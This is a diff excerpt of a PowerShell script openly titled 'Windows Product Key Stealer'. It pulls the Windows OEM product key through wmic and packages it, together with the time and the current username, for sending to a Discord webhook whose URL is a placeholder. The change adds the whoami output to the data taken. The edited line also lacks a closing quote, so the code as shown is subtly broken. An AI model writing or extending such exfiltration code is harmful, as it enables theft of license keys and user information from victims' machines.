@@ -1,6 +1,6 @@
 $content = wmic path softwarelicensingservice get OA3xOriginalProductKey
 $webhookUrl = "discord webhook url"
-$content = $content+"`n`nTime: $(Get-Date)`nPC Name: $env:computername"
+$content = $content+"`n`nTime: $(Get-Date)`nUser: $(whoami)
 [System.Collections.ArrayList]$embedArray = @()
 $title       = 'Windows Product Key Stealer'
 $description = '```'+$content+'```'
